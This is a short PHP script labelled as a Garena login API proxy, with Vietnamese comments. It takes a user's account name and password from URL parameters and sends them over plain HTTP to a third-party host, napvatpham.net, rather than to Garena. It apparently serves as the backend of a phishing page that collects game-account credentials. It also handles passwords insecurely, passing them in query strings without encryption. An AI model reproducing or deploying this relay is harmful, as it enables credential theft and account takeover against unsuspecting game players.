<?php
/**
 * API Login Proxy Garena
 */

// Lấy các tham số từ Query String (URL) mà Axios gửi tới
$account  = $_GET['account'] ?? '';
$password = $_GET['password'] ?? '';
$id       = $_GET['id'] ?? '213456754324567'; // Mặc định nếu không có

// 1. Kiểm tra đầu vào cơ bản
if (empty($account) || empty($password)) {
    header('Content-Type: application/json');
    echo json_encode(['error' => 'error_auth', 'message' => 'Thiếu tài khoản hoặc mật khẩu']);
    exit;
}

// 2. Xây dựng URL đích đến server napvatpham.net
$targetUrl = "http://napvatpham.net/garena/login.php?account=" . urlencode($account) . "&password=" . urlencode($password) . "&id=" . urlencode($id);

// 3. Khởi tạo cURL để lấy dữ liệu JSON
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $targetUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// 4. Trả kết quả về cho Axios
// Lưu ý: Không dùng header JSON ở đây để phù hợp với việc bạn có thể cần parse thủ công ở JS
// Hoặc nếu Axios nhận dạng tốt, bạn có thể thêm: header('Content-Type: application/json');

if ($response === false) {
    echo json_encode(['error' => 'server_timeout', 'message' => 'Không thể kết nối tới server Garena']);
} else {
    // Xuất toàn bộ cấu trúc JSON nhận được từ napvatpham.net
    echo $response;
}